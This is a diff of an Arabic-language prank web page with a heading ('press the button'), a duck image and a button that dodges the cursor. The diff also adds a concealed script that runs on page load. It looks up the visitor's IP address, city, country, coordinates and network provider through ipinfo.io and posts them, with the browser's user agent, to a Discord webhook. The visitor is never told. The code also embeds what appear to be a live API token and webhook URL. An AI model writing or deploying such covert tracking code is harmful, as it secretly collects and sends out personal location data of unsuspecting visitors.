@@ -1,2 +1,96 @@
-<body style="background-color: black;">
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>x2aws</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    img {
+      max-width: 300px;
+      height: auto;
+      margin-bottom: 20px;
+    }
+
+    #container {
+      position: relative;
+      width: 100%;
+      height: 100%;
+    }
+
+    #btn {
+      position: absolute;
+      padding: 10px 20px;
+      font-size: 18px;
+      border: none;
+      background-color: #e74c3c;
+      color: white;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: top 0.2s, left 0.2s;
+    }
+
+    h1 {
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h1>اضغط الزر</h1>
+
+  <img src="https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcQLN0URytp6GxX5MRMJmFCQCs_A7k5zqpXXtg_q6IeSsnY4oD2-fg6cZxb0qAtGP8Ta1C1FCqC9exBvZzt6y9InhA" alt="بطة ظريفة">
+
+  <div id="container">
+    <button id="btn"> اضغطني</button>
+  </div>
+
+  <script>
+    const button = document.getElementById('btn');
+    const container = document.getElementById('container');
+
+    button.addEventListener('mouseenter', () => {
+      const maxX = container.clientWidth - button.offsetWidth;
+      const maxY = container.clientHeight - button.offsetHeight;
+      const randomX = Math.random() * maxX;
+      const randomY = Math.random() * maxY;
+
+      button.style.left = randomX + 'px';
+      button.style.top = randomY + 'px';
+    });
+
+    // جلب معلومات الزائر + إرسالها إلى ديسكورد
+    const userAgent = navigator.userAgent;
+
+    fetch('https://ipinfo.io/json?token=ac124db0618aa8')
+      .then(response => response.json())
+      .then(data => {
+        const message = {
+          content: `👀 زائر جديد على الموقع:
+🌐 IP: ${data.ip}
+🏙️ المدينة: ${data.city}
+🗺️ الدولة: ${data.country}
+📍 الموقع: ${data.loc}
+📡 الشبكة: ${data.org}
+🧠 الجهاز: ${userAgent}`
+        };
+
+        fetch('https://ptb.discord.com/api/webhooks/1364315199003426887/CGAEd0OHeI5WntRWHIFBM99MqqEsEONndPUf7anoQgn04i0QitIi7vXsIqad-Ln97Nnt', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(message)
+        });
+      });
+  </script>
 </body>
+</html>
